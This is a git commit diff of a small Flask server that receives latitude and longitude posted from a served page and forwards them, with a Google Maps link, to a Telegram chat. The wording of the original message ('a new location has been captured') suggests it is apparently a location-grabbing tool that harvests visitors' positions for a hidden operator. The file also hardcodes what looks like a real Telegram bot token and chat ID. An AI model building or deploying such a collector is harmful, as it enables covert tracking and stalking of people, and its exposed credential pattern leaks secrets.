770ec05f8c45e492750782024ff7c33be92334c7
arab0009 <abu.taha9999999999@gmail.com>
2025-08-03 21:11:52 +0300

    Update app.py

--- app.py
+++ app.py
@@ -6,23 +6,23 @@ app = Flask(__name__)
 BOT_TOKEN = "8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0"
 CHAT_ID = "7485197107"
 
-@app.route('/')
-def index():
-    return send_from_directory('.', 'index.html')
+@app.route("/")
+def main():
+    return send_from_directory(".", "index.html")
 
-@app.route('/location', methods=['POST'])
-def receive_location():
+@app.route("/location", methods=["POST"])
+def location():
     data = request.get_json()
-    lat = data.get('lat')
-    lon = data.get('lon')
-
+    lat = data.get("lat")
+    lon = data.get("lon")
     if lat and lon:
-        location_msg = f"📍 تم التقاط موقع جديد:\nLatitude: {lat}\nLongitude: {lon}\nhttps://maps.google.com/?q={lat},{lon}"
+        text = f"📍 New Location:\nLatitude: {lat}\nLongitude: {lon}\nhttps://maps.google.com/?q={lat},{lon}"
         requests.post(
             f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-            json={"chat_id": CHAT_ID, "text": location_msg}
+            json={"chat_id": CHAT_ID, "text": text}
         )
-    return {"status": "received"}
+        return {"status": "ok"}
+    return {"status": "error"}
 
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=10000)
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=10000)
